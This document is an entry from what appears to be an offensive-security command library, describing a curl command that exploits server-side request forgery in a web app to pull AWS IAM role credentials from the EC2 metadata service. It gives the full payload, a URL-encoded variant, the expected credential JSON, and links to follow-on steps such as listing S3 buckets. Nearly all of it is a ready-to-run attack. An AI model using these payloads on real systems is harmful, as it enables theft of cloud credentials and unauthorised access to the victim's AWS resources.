---
id: 32e51b14-41e8-420e-a7d4-a73b044c4ace
name: curl-fetch-iam-security-credentials
type: command
executor: bash
data: >-
  curl
  "http://target-app.com/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanstalk-ec2-role"
  -v
output: null
created_at: '2023-04-06T03:56:38.274121+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
  - macOS
tags:
  - ssrf
  - aws
  - iam
verified: true
validated: true
---

# curl-fetch-iam-security-credentials

## Command

```bash
curl "http://target-app.com/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanstalk-ec2-role" -v
```

## Description

This command uses SSRF to retrieve temporary IAM security credentials from an AWS EC2 instance's metadata service through a vulnerable web application. It targets the role's credential endpoint to obtain AccessKeyId, SecretAccessKey, and Token for subsequent AWS API calls.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `http://target-app.com/api/fetch` | Vulnerable SSRF endpoint | Yes |
| `url=http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanstalk-ec2-role` | IAM role credentials URL (replace role name if needed) | Yes |
| `-v` | Verbose output for debugging | No |

## Examples

### Basic Usage

```bash
curl "http://target-app.com/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanstalk-ec2-role" -v
```

### With URL Encoding

```bash
curl "http://target-app.com/api/fetch?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2Fiam%2Fsecurity-credentials%2Frole-name" -v
```

## Expected Output

JSON credentials response:
```json
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "wJalrXUtnFEMI...",
  "Token": "IQoJb3Blbl...
}
```

## Related

- [[procedures/Exploit-SSRF-for-AWS-Cloud-Instance-Metadata-Access]]
- [[commands/aws-list-s3-bucket-contents]]
